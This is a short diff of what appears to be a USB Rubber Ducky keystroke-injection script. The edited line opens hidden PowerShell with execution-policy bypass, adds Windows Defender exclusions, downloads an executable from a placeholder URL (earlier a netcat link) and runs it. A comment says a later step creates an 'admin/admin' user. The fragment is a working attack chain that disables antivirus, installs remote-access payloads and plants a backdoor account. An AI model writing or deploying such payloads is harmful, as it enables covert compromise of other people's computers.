@@ -20,7 +20,7 @@ DELAY 400
 STRING mkdir C:\tmp
 ENTER
 DELAY 200
-STRING powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command {Add-MpPreference -Force -ExclusionPath "C:\tmp"}; Invoke-WebRequest -Uri '<NetcatEXE_Download_Link>' -Outfile 'C:\tmp\install.exe'; Add-MpPreference -ExclusionProcess -Force 'C:\tmp\install.exe'; Start-Process -FilePath 'C:\tmp\install.exe'
+STRING powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command {Add-MpPreference -Force -ExclusionPath "C:\tmp"}; Invoke-WebRequest -Uri '<PayloadURL>' -Outfile 'C:\tmp\install.exe'; Add-MpPreference -ExclusionProcess -Force 'C:\tmp\install.exe'; Start-Process -FilePath 'C:\tmp\install.exe'
 ENTER
 DELAY 3000
 REM ## create user: admin & password: admin
